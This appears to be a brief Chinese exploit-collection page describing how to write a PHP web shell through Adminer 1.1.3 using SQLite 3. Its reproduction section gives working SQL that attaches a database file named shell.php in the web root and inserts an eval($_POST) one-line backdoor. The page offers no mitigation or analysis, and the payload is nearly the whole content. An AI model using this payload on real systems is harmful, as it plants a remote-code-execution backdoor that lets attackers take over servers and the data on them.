<h1>Adminers 1.1.3 （SQLite 3 写入一句话木马）</h1>
<h2>一、漏洞简介</h2>
<p>需要登陆Adminers，并且需要知道网站的路径。</p>
<h2>二、漏洞影响</h2>
<h2>三、复现过程</h2>
<pre><code class="language-php">ATTACH DATABASE 'z.php' AS t;create TABLE t.e (d text);/*

ATTACH DATABASE '/网站/路径/shell.php' AS t;insert INTO t.e (d) VALUES ('&lt;?php eval($_POST[a])?&gt;');/*</code></pre>
